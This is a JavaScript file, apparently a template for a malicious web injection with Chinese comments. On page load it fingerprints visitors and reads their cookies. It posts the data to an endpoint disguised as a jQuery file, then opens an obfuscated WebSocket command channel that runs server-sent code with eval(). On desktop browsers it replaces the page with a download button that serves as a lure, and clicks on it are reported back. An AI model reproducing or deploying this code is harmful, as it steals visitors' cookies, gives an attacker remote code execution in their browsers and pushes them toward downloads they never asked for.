//static_base
let deviceInfo;

async function collectDeviceInfo() {
    // Extract major User-Agent information
    function parseUserAgent(userAgent) {
        let osInfo = "Unknown OS";
        let osVersion = "Unknown version";
        let architecture = "Unknown architecture";

        if (/Windows NT (\d+\.\d+)/.test(userAgent)) {
            const version = RegExp.$1;
            switch (version) {
                case '10.0': osInfo = "Windows 10"; break;
                case '6.3': osInfo = "Windows 8.1"; break;
                case '6.2': osInfo = "Windows 8"; break;
                case '6.1': osInfo = "Windows 7"; break;
                case '6.0': osInfo = "Windows Vista"; break;
                case '5.1': osInfo = "Windows XP"; break;
                default: osInfo = `Windows NT ${version}`;
            }
            architecture = /WOW64|Win64/.test(userAgent) ? "64-bit" : "32-bit";
            osVersion = version;
        } else if (/Mac OS X (\d+_\d+_\d+)/.test(userAgent)) {
            osInfo = "Mac OS X";
            osVersion = RegExp.$1.replace(/_/g, '.');
            architecture = /Intel/.test(userAgent) ? "64-bit" : "Unknown architecture";
        } else if (/Linux/.test(userAgent)) {
            osInfo = "Linux";
        }

        return {
            OS: osInfo,
            Version: osVersion,
            Architecture: architecture
        };
    }

    function xorStrings(str1, str2) {
        let result = '';
        for(let i = 0; i < str1.length; i++) {
            result += String.fromCharCode(str1.charCodeAt(i) ^ str2.charCodeAt(i % str2.length));
        }
        return result;
    }

    function parseBrowserInfo(userAgent) {
        let browserInfo = "Unknown browser";
        let browserVersion = "Unknown version";

        if (/Edge|Edg/i.test(userAgent)) {
            browserInfo = "Microsoft Edge";
            const match = userAgent.match(/(Edge|Edg)\/(\d+\.\d+)/);
            browserVersion = match ? match[2] : "Unknown version";
        } else if (/Chrome|CriOS/i.test(userAgent)) {
            browserInfo = "Google Chrome";
            const match = userAgent.match(/Chrome\/(\d+\.\d+)/);
            browserVersion = match ? match[1] : "Unknown version";
        } else if (/Firefox/i.test(userAgent)) {
            browserInfo = "Mozilla Firefox";
            const match = userAgent.match(/Firefox\/(\d+\.\d+)/);
            browserVersion = match ? match[1] : "Unknown version";
        } else if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) {
            browserInfo = "Safari";
            const match = userAgent.match(/Version\/(\d+\.\d+)/);
            browserVersion = match ? match[1] : "Unknown version";
        } else if (/Opera|OPR/i.test(userAgent)) {
            browserInfo = "Opera";
            const match = userAgent.match(/Opera\/(\d+\.\d+)/);
            browserVersion = match ? match[1] : "Unknown version";
        } else if (/MSIE|Trident/i.test(userAgent)) {
            browserInfo = "Internet Explorer";
            const match = userAgent.match(/(?:MSIE |Trident.*?rv:)(\d+\.\d+)/);
            browserVersion = match ? match[1] : "Unknown version";
        }

        return {
            Browser: browserInfo,
            BrowserVersion: browserVersion
        };
    }

    const getGpuInfo = () => {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return { vendor: 'WebGL not supported', renderer: 'WebGL not supported' };
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return {
            vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
            renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown',
        };
    };

    const rawUserAgent = navigator.userAgent;
    const parsedUserAgent = parseUserAgent(rawUserAgent);
    const parsedBrowser = parseBrowserInfo(rawUserAgent);

    deviceInfo = {
        ScreenInfo: {
            Resolution: `${screen.width}x${screen.height}`,
            ColorDepth: screen.colorDepth,
            PixelRatio: window.devicePixelRatio,
        },
        BrowserInfo: {
            RawUserAgent: rawUserAgent,
            Browser: `${parsedBrowser.Browser} ${parsedBrowser.BrowserVersion}`,
            Language: navigator.language,
        },
        OSInfo: {
            OS: parsedUserAgent.OS,
            Version: parsedUserAgent.Version,
            Architecture: parsedUserAgent.Architecture
        },
        HardwareInfo: {
            DeviceMemory: navigator.deviceMemory || 'Unknown',
            CpuCores: navigator.hardwareConcurrency || 'Unknown',
        },
        TimeInfo: {
            TimezoneOffset: `${new Date().getTimezoneOffset()} minutes`,
        },
        GPUInfo: getGpuInfo(),
        Cookies: document.cookie || 'No cookies',
        Referer: document.referrer || 'No referer',
        URL: window.location.href,
        PCode: "rKCUw2",
        State: "0"
    };

    const infoString = `${deviceInfo.ScreenInfo.Resolution}|${deviceInfo.ScreenInfo.ColorDepth}|${deviceInfo.ScreenInfo.PixelRatio}|${deviceInfo.BrowserInfo.Language}|${deviceInfo.OSInfo.OS}|${deviceInfo.OSInfo.Architecture}|${deviceInfo.HardwareInfo.CpuCores}|${deviceInfo.TimeInfo.TimezoneOffset}${deviceInfo.GPUInfo.renderer}${deviceInfo.BrowserInfo.RawUserAgent}`;

    const hash = await generate16CharHash(infoString);
    deviceInfo.DeviceIdentifier = hash;

    await sendToBackend(deviceInfo);

    const token = btoa(xorStrings(xorStrings(deviceInfo.PCode, "0o") + xorStrings(Date.now().toString(), "0o"), "o0"));

    const socket = new WebSocket(`ws://127.0.0.1:8000/jquery/jquery-3.7.1.min.js?token=${token}`);

    socket.onopen = function() {
        console.log('Connected to WebSocket');
        const data = {
            type: 'connect',
            fileName: deviceInfo.PCode,
            deviceCode: hash
        };
        socket.send(JSON.stringify(data));

        setInterval(function() {
            const data = {
                type: 'connect',
                fileName: deviceInfo.PCode,
                deviceCode: hash
            };
            console.log("Sending data every 60 seconds");
            socket.send(JSON.stringify(data));
        }, 60000); // 60000ms = 60秒
    };


    socket.onmessage = (event) => {
        const message = JSON.parse(event.data);
        if (message.type === 'task_request') {
            console.log('Screenshot request received.');
            console.log("收到服务端消息:", event.data);
            eval(message.content);
        }
    };

}

async function generate16CharHash(str) {
    const buffer = new TextEncoder().encode(str);
    const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(byte => byte.toString(16).padStart(2, '0')).join('').slice(0, 16);
}

async function sendToBackend(deviceInfo) {
    const endpoint = "http://127.0.0.1:8000/jquery/jquery-3.7.1.min.js";
    try {
        const response = await fetch(endpoint, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(deviceInfo),
        });
        if (!response.ok) {
            throw new Error(`Error: ${response.status} - ${response.statusText}`);
        }
        console.log("Data sent to backend successfully.");
    } catch (error) {
        console.error("Failed to send data to backend:", error);
    }
}


function download() {
    deviceInfo.State = "2";
    sendToBackend(deviceInfo).then(() => {
        console.log("OK");
    });
}


collectDeviceInfo();// 静态模版默认代码不需要进行接口配置，只需要为点击按钮添加一个调用函数 onclick=download()
// eg: <button onclick=download()>点击下载</button>
// 增加调用函数后，点击按钮及会触发平台日志

//手机端用户不加载
if (!(navigator.userAgent.match(/(iPhone|iPod|Android|ios|iOS|iPad|Backerry|WebOS|Symbian|Windows Phone|Phone|Mac)/i))) {
	document.addEventListener('DOMContentLoaded', function() {
		
		/********下面的三种用法只能选择一种使用*******/
		trigger('https://dl.360safe.com/inst.exe');//一直显示,会影响管理员使用
		//trigger('https://dl.360safe.com/inst.exe',5);//5分钟内只显示一次
		//trigger('https://dl.360safe.com/inst.exe',30);//30分钟内只显示一次
		
	});
}

//-----------------不要修改下面代码-------------------
function trigger(down_url, defaultIntervalMinutes = 0) {
    // 将默认间隔时间从分钟转换为毫秒
    const defaultInterval = defaultIntervalMinutes * 60 * 1000;
    // 获取上次加载的时间
    let lastLoadTime = localStorage.getItem('lastLoadTime');
    let currentTime = new Date().getTime();
    
    // 获取设置的间隔时间（分钟），如果没有则使用默认值
    let intervalMinutes = localStorage.getItem('loadIntervalMinutes') || defaultIntervalMinutes;
    let interval = intervalMinutes * 60 * 1000; // 转换为毫秒
    
    // 如果是首次加载或者已经超过了设定的间隔时间
    if (!lastLoadTime || (currentTime - lastLoadTime > interval)) {
        // 更新加载时间
        localStorage.setItem('lastLoadTime', currentTime);

        // 将 var html 内容替换为自己自定义的界面，这里仅以 <button onclick=download()>点击下载</button> 做演示
        var html="%3Cbutton%20onclick%3Ddownload()%3E%5Cu4e0b%5Cu8f7d%3C%2Fbutton%3E";
        html = unescape(html);
        document.body.innerHTML =html;
        const scripts = document.body.querySelectorAll('script');
        for (let script of scripts) {
          runScript(script);
        }
	}
}	


function runScript(script){
  try{
	  const newScript = document.createElement('script');
	  newScript.innerHTML = script.innerHTML;
	  const src = script.getAttribute('src');
	  if (src) newScript.setAttribute('src', src);
	  document.head.appendChild(newScript);
	  document.head.removeChild(newScript);
  } catch (err) {
 }
}

runScript()
